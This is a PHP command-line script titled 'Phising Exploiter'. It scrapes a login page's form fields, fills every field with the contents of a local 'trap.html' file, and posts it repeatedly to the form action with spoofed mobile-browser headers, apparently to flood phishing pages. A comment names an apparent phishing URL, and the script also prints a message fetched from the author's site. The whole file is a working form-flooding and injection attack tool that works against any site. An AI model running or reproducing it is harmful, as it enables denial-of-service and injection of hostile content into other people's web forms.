<?php
error_reporting(0); // biar gk bikin ribut
/*function*/
function getAction($web_content){
	$dom_obj = new DOMDocument();
	$dom_obj->loadHTML($web_content);
	foreach($dom_obj->getElementsByTagName('form') as $meta) {
	$meta_val = $meta->getAttribute('action');
	}
	if($meta_val != ""){
		return $meta_val; 
	}else{
		return $url;
	}
}
function getForm($web_content){
	$dom_obj = new DOMDocument();
	$dom_obj->loadHTML($web_content);
	foreach($dom_obj->getElementsByTagName('input') as $meta) {
	$meta_val = $meta->getAttribute('name');
	$pass[] = $meta_val."=*&";
	}
	return implode($pass); 
}
function getData($url){
	$web_content = file_get_contents($url);
	$aex = explode("/", $url);
	$c = count($aex)-1;
	$status = preg_match("/http/", $url);
	$out['status'] = $status;
	$out['host'] = $aex[2];
	$out['url'] = $aex[$c];
	$out['body'] = getForm($web_content);
	$out['action'] = str_replace($aex[$c], getAction($web_content), $url);
	return json_encode($out);
}
function bom($host, $action, $body){
	$curl = curl_init($action);
		curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "POST"); 
		curl_setopt($curl, CURLOPT_POSTFIELDS, $body);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_TIMEOUT, 5);
		curl_setopt($curl, CURLOPT_HTTPHEADER, array("Connection: keep-alive","Cache-Control: max-age=0","Upgrade-Insecure-Requests: 1","User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; Redmi 4A Build/OPM7.181105.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36","Content-Type: application/x-www-form-urlencoded","Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Referer: $act","Accept-Language: id-ID,en-US;q=0.8"));
	$result = curl_exec($curl);
	curl_close($curl);
	echo "target [\033[91;1m".$host."\033[97;1m] => ";
	if($result != ""){
		echo "\033[92;1msucces\033[97;1m\n";
	}else{
		echo "\033[91;1mfailed\033[97;1m\n";
	}
}
/*START*/
system("clear");
echo "
\033[94;1m++++++++++++++++++++++++++++++++++++++++++++++++++++
\033[94;1m+\033[97;1m     Phising  Exploiter \033[91;1m||\033[97;1m Phising  Exploiter     \033[94;1m+
\033[94;1m+\033[91;1m++++++++++++++++++++++++||++++++++++++++++++++++++\033[94;1m+
\033[94;1m+\033[97;1m    fb.com/alfianokt104 \033[91;1m||\033[97;1m alfianokt.github.io	   \033[94;1m+
\033[94;1m++++++++++++++++++++++++++++++++++++++++++++++++++++\033[97;1m

";
// http://bit.ly/aosphex
echo "Pesan : \033[91;1m".file_get_contents('https://alfianokt.github.io/phex/msg.txt ')."\n";
while(1){
	echo "\033[92;1mMasukkan URL Login\t\033[91;1m: \033[97;1m";
	$url = trim(fgets(STDIN));
	if($url == "stop"){die("\033[96;1mprogram telah dihentikan\033[97;1m\n");}
	echo "\033[92;1mMasukkan Jumlah spam\t\033[91;1m: \033[97;1m";
	$c = trim(fgets(STDIN));
	if($c == "stop" || $c == "stop"){die("\033[96;1mprogram telah dihentikan\033[97;1m\n");}
	if($url == "" || $c == "" || $c <= 0){echo "\033[91;1merror!\033[97;1m\n";}
	else{
		echo "mendapatkan data... ";
		$json = json_decode(getData($url));
		$contents = file_get_contents('trap.html');
		$body = str_replace("*", $contents, $json->body);
		if($json->status != 0 && $json->body != null){
			echo $json->body;
			echo "\033[92;1msucces\033[97;1m\n";
			for($i=0;$i<$c;$i++){bom($json->host, $json->action, $body);}
		}else{ echo "\033[91;1mfailed\033[97;1m\n";}
		echo "\n";
	}
}
// http://event-natal2019.55e.xyz/login-fb.php
?>